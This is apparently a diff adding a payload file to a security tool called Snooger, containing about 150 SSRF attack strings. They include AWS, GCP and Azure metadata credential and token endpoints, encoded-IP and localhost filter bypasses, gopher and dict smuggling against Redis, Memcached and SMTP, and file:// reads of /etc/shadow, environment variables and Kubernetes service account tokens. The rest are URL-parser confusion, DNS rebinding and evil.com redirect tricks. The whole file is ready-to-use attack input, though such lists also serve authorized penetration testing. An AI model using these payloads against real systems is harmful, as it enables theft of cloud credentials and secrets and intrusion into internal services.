@@ -1,0 +1,150 @@
+# Snooger SSRF Payloads — 150+ real payloads with bypass techniques
+# Categories: Cloud Metadata, IP Bypass, Protocol, DNS Rebinding, URL Parser Tricks
+# ==================================================================================
+
+# === AWS Metadata (IMDSv1) ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# === GCP Metadata ===
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+
+# === Azure Metadata (IMDS) ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
+
+# === DigitalOcean Metadata ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/region
+
+# === Alibaba Cloud Metadata ===
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/hostname
+
+# === Oracle Cloud Metadata ===
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v2/instance/
+
+# === Localhost Variants ===
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+http://127.0.0.1:3000/
+http://127.0.0.1:9090/
+http://localhost/
+http://localhost:80/
+http://localhost:8080/
+http://[::1]/
+http://[::1]:80/
+http://0.0.0.0/
+http://0.0.0.0:80/
+http://[0:0:0:0:0:0:0:1]/
+http://[0000::1]/
+
+# === IP Bypass (Decimal/Hex/Octal) ===
+http://2130706433/
+http://0x7f000001/
+http://017700000001/
+http://0177.0.0.1/
+http://0x7f.0.0.1/
+http://0177.0000.0000.0001/
+http://0x7f.0x0.0x0.0x1/
+http://127.1/
+http://127.0.1/
+http://0/
+http://0.0.0.0/
+http://127.127.127.127/
+http://[::]/ 
+http://[::ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+
+# === Meta-IP for Cloud ===
+http://0xA9FEA9FE/
+http://2852039166/
+http://0251.0376.0251.0376/
+http://0xa9.0xfe.0xa9.0xfe/
+http://169.254.169.254.xip.io/
+http://A.169.254.169.254.1time.127.0.0.1.1time.repeat.rebind.network/
+
+# === Internal Services ===
+http://127.0.0.1:6379/
+http://127.0.0.1:11211/
+http://127.0.0.1:27017/
+http://127.0.0.1:5432/
+http://127.0.0.1:3306/
+http://127.0.0.1:9200/
+http://127.0.0.1:9300/
+http://127.0.0.1:2375/
+http://127.0.0.1:2376/
+http://127.0.0.1:5672/
+http://127.0.0.1:15672/
+http://127.0.0.1:8500/
+http://127.0.0.1:4848/
+http://127.0.0.1:10000/
+http://127.0.0.1:10250/
+http://127.0.0.1:10255/
+
+# === Protocol Smuggling ===
+gopher://127.0.0.1:6379/_GET%20/
+gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Ainfo%0D%0A
+gopher://127.0.0.1:11211/_stats%0D%0A
+gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0A
+gopher://127.0.0.1:3306/_
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:11211/stats
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///proc/net/tcp
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+file:///c:/windows/win.ini
+jar:http://evil.com!/test.txt
+jar:https://evil.com!/test.txt
+netdoc:///etc/passwd
+ldap://127.0.0.1/
+ldap://127.0.0.1:389/
+tftp://evil.com/file
+
+# === URL Parser Confusion ===
+http://evil.com@127.0.0.1/
+http://127.0.0.1@evil.com/
+http://127.0.0.1#@evil.com/
+http://127.0.0.1%23@evil.com/
+http://evil.com%40127.0.0.1/
+http://127.0.0.1:80%40evil.com/
+http://evil.com%00@127.0.0.1/
+http://evil.com\@127.0.0.1/
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.0.0.1:25/%0D%0AHELO+localhost
+http://127.0.0.1/\t169.254.169.254
+http://127.0.0.1%0d%0a%0d%0aGET%20/latest/meta-data/
+
+# === DNS Rebinding ===
+http://1time.127.0.0.1.1time.169.254.169.254.repeat.rebind.network/
+http://A.169.254.169.254.1time.127.0.0.1.repeat.rebind.network/latest/meta-data/
+http://make-169.254.169.254-rr.1u.ms/
+http://spoofed.burpcollaborator.net/
+
+# === Redirect-Based SSRF ===
+https://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/
+http://evil.com/302.php
